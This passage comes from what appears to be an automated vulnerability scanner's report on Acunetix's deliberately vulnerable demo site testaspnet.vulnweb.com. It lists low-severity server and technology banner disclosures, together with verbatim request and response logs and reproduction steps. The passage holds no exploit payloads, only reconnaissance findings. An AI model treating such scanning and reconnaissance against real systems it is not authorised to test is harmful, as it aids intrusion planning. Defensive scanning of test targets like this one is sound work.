  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:26:37 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 508.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Signup.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F24] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/rssFeed.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8f1a5bb4 (exactly as issued by the engine) ---
  GET /rssFeed.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2118
    content-type: text/xml; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:03 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <rss version="2.0">\x0d
          <channel>\x0d
            <title>Acunetix testaspnet</title>\x0d
            <link>http://testaspnet.acunetix.com/</link>\x0d
            <description>\x0d
              This is the syndication feed for testaspnet.acunetix.com.\x0d
            </description>\x0d
    \x0d
            <item>\x0d
              <title>Acunetix Vulnerability Scanner Now With Network Security Scans</title>\x0d
              <description>\x0d
    ... [42 more lines, 2279 chars total]
  elapsed_ms: 323.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/rssFeed.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F25] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/rssFeed.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8f1a5bb4 (exactly as issued by the engine) ---
  GET /rssFeed.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2118
    content-type: text/xml; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:03 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <rss version="2.0">\x0d
          <channel>\x0d
            <title>Acunetix testaspnet</title>\x0d
            <link>http://testaspnet.acunetix.com/</link>\x0d
            <description>\x0d
              This is the syndication feed for testaspnet.acunetix.com.\x0d
            </description>\x0d
    \x0d
            <item>\x0d
              <title>Acunetix Vulnerability Scanner Now With Network Security Scans</title>\x0d
              <description>\x0d
    ... [42 more lines, 2279 chars total]
  elapsed_ms: 323.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/rssFeed.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F26] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Comments.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0c4e177e (exactly as issued by the engine) ---
  GET /Comments.aspx?id=2
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22881
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:04 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 703.7
  --- RAW REQUEST req-d2cf860e (exactly as issued by the engine) ---
  POST /Comments.aspx?id=0
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFgoCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WBB8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fucx8ABRJSZWFkTmV3cy5hc3B4P2lkPTBkAgcPFgIfAQVEU2VhbWxlc3MgT3BlblZBUyBpbnRlZ3JhdGlvbiBub3cgYWxzbyBhdmFpbGFibGUgb24gV2luZG93cyBhbmQgTGludXhkAgkPZBYCAgEPZBZ4Zg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgEPZBYCZg8WAh4FY2xhc3MFB0NvbW1lbnRkAgIPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgMPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIED2QWAmYPFgIfAwUHQ29tbWVudGQCBQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCBg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgcPZBYCZg8WAh8DBQdDb21tZW50ZAIID2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIJD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCCg9kFgJmDxYCHwMFB0NvbW1lbnRkAgsPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgwPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIND2QWAmYPFgIfAwUHQ29tbWVudGQCDg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCDw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhAPZBYCZg8WAh8DBQdDb21tZW50ZAIRD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAISD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCEw9kFgJmDxYCHwMFB0NvbW1lbnRkAhQPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAhUPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIWD2QWAmYPFgIfAwUHQ29tbWVudGQCFw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCGA9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhkPZBYCZg8WAh8DBQdDb21tZW50ZAIaD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIbD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCHA9kFgJmDxYCHwMFB0NvbW1lbnRkAh0PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAh4PZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIfD2QWAmYPFgIfAwUHQ29tbWVudGQCIA9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCIQ9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAiIPZBYCZg8WAh8DBQdDb21tZW50ZAIjD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIkD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCJQ9kFgJmDxYCHwMFB0NvbW1lbnRkAiYPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAicPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIoD2QWAmYPFgIfAwUHQ29tbWVudGQCKQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCKg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAisPZBYCZg8WAh8DBQdDb21tZW50ZAIsD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAItD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCLg9kFgJmDxYCHwMFB0NvbW1lbnRkAi8PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjAPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIxD2QWAmYPFgIfAwUHQ29tbWVudGQCMg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCMw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAjQPZBYCZg8WAh8DBQdDb21tZW50ZAI1D2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAI2D2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCNw9kFgJmDxYCHwMFB0NvbW1lbnRkAjgPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjkPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAI6D2QWAmYPFgIfAwUHQ29tbWVudGQCOw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmRke2IHTIcKpvVhP2S6lzx9jU2NYQ8%3D&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQLQ%2FumeCgKAgcfvBQK
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13838
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:51 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [45 more lines, 4168 chars total]
  elapsed_ms: 535.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Comments.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F27] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Comments.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0c4e177e (exactly as issued by the engine) ---
  GET /Comments.aspx?id=2
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22881
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:04 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 703.7
  --- RAW REQUEST req-d2cf860e (exactly as issued by the engine) ---
  POST /Comments.aspx?id=0
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFgoCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WBB8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fucx8ABRJSZWFkTmV3cy5hc3B4P2lkPTBkAgcPFgIfAQVEU2VhbWxlc3MgT3BlblZBUyBpbnRlZ3JhdGlvbiBub3cgYWxzbyBhdmFpbGFibGUgb24gV2luZG93cyBhbmQgTGludXhkAgkPZBYCAgEPZBZ4Zg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgEPZBYCZg8WAh4FY2xhc3MFB0NvbW1lbnRkAgIPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgMPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIED2QWAmYPFgIfAwUHQ29tbWVudGQCBQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCBg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAgcPZBYCZg8WAh8DBQdDb21tZW50ZAIID2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIJD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCCg9kFgJmDxYCHwMFB0NvbW1lbnRkAgsPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAgwPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIND2QWAmYPFgIfAwUHQ29tbWVudGQCDg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCDw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhAPZBYCZg8WAh8DBQdDb21tZW50ZAIRD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAISD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCEw9kFgJmDxYCHwMFB0NvbW1lbnRkAhQPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAhUPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIWD2QWAmYPFgIfAwUHQ29tbWVudGQCFw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCGA9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAhkPZBYCZg8WAh8DBQdDb21tZW50ZAIaD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIbD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCHA9kFgJmDxYCHwMFB0NvbW1lbnRkAh0PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAh4PZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIfD2QWAmYPFgIfAwUHQ29tbWVudGQCIA9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCIQ9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAiIPZBYCZg8WAh8DBQdDb21tZW50ZAIjD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAIkD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCJQ9kFgJmDxYCHwMFB0NvbW1lbnRkAiYPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAicPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIoD2QWAmYPFgIfAwUHQ29tbWVudGQCKQ9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCKg9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAisPZBYCZg8WAh8DBQdDb21tZW50ZAIsD2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAItD2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCLg9kFgJmDxYCHwMFB0NvbW1lbnRkAi8PZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjAPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAIxD2QWAmYPFgIfAwUHQ29tbWVudGQCMg9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmQCMw9kFgJmDxYCHwEFJTxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1iZWZvcmUuZ2lmIj5kAjQPZBYCZg8WAh8DBQdDb21tZW50ZAI1D2QWAmYPFgIfAQUkPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWFmdGVyLmdpZiI%2BZAI2D2QWAmYPFgIfAQUlPElNRyBzcmM9ImltYWdlcy9jb21tZW50LWJlZm9yZS5naWYiPmQCNw9kFgJmDxYCHwMFB0NvbW1lbnRkAjgPZBYCZg8WAh8BBSQ8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYWZ0ZXIuZ2lmIj5kAjkPZBYCZg8WAh8BBSU8SU1HIHNyYz0iaW1hZ2VzL2NvbW1lbnQtYmVmb3JlLmdpZiI%2BZAI6D2QWAmYPFgIfAwUHQ29tbWVudGQCOw9kFgJmDxYCHwEFJDxJTUcgc3JjPSJpbWFnZXMvY29tbWVudC1hZnRlci5naWYiPmRke2IHTIcKpvVhP2S6lzx9jU2NYQ8%3D&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQLQ%2FumeCgKAgcfvBQK
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13838
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:51 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [45 more lines, 4168 chars total]
  elapsed_ms: 535.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Comments.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F28] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/ReadNews.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8fad38b9 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 30585
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:13 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 711.9
  --- RAW REQUEST req-6e2ed2b8 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=0
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22818
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:42 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
